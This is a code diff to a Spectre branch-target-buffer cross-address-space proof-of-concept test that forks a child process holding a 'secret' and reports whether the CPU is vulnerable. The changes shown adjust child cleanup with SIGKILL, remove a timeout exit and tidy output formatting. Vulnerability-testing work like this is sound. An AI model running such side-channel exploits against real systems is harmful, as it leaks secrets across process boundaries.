@@ -71,9 +71,9 @@ void move_animal(Animal *animal)
 int main(int argc, char **argv)
 {
     PREPARE();
-    printf("Spectre_BTB_ca_ip Begins...\n");
     // Cross-address-space attack, so we fork
-    int is_child = (fork() == 0);
+    pid_t pid_child = fork();
+    int is_child = (pid_child == 0);
     Fish *fish = new Fish();
     Bird *bird = new Bird(); // contains secret
 
@@ -94,10 +94,6 @@ int main(int argc, char **argv)
             for (int j = 0; j < 10000; j++)
             {
                 move_animal(fish);
-            }
-            if (clock() - start_time > timeout)
-            {
-                exit(-1);
             }
         }
         // Flush our shared memory
@@ -122,8 +118,8 @@ int main(int argc, char **argv)
             }
             if (clock() - start_time > timeout)
             {
-                printf(ANSI_COLOR_YELLOW "Spectre_BTB_ca_ip: Timeout\n" ANSI_COLOR_RESET);
-                printf("Spectre_BTB_ca_ip Done!\n\n");
+                printf(ANSI_COLOR_YELLOW "Spectre_BTB_ca_ip: Timeout" ANSI_COLOR_RESET "\n");
+                kill(pid_child, SIGKILL);
                 exit(-1);
             }
         }
@@ -133,15 +129,15 @@ int main(int argc, char **argv)
         int exit_result = 0;
         if ((double)passed_count / MAX_TRY_TIMES > 0.3)
         {
-            printf(ANSI_COLOR_RED "Spectre_BTB_ca_ip: Vulnerable\n" ANSI_COLOR_RESET);
+            printf(ANSI_COLOR_RED "Spectre_BTB_ca_ip: Vulnerable" ANSI_COLOR_RESET "\n");
             exit_result = EXIT_SUCCESS;
         }
         else
         {
-            printf(ANSI_COLOR_GREEN "Spectre_BTB_ca_ip: Not Vulnerable\n" ANSI_COLOR_RESET);
+            printf(ANSI_COLOR_GREEN "Spectre_BTB_ca_ip: Not Vulnerable" ANSI_COLOR_RESET "\n");
             exit_result = EXIT_FAILURE;
         }
-        printf("Spectre_BTB_ca_ip Done!\n\n");
+        kill(pid_child, SIGKILL);
         exit(exit_result);
     }
     
